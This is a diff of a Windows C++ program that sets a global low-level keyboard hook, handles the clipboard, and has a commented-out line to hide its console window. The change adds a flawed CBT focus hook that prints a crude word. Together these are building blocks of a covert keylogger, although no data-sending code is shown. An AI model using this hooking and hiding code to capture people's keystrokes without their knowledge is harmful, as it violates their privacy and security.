@@ -51,9 +51,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 					CloseClipboard();
 				}
-
-
-
 			}
 		}
 
@@ -62,10 +59,23 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 #pragma endregion
 
+#pragma region WindowHk
+
+LRESULT CALLBACK windowChangeHook(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode == HCBT_SETFOCUS || lParam == HCBT_SETFOCUS)
+		cout << "COCK";
+
+	return(CallNextHookEx(NULL, nCode, wParam, lParam));
+}
+
+#pragma endregion
+
 int main()
 {	
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
-
+	HHOOK hhkWindowChange = SetWindowsHookEx(WH_CBT, (HOOKPROC)windowChangeHook, 0, 0);
+	
 	MSG msg;
 
 	while (!GetMessage(&msg, NULL, NULL, NULL)) 
@@ -73,6 +83,8 @@ int main()
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+
+	
 
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
 	
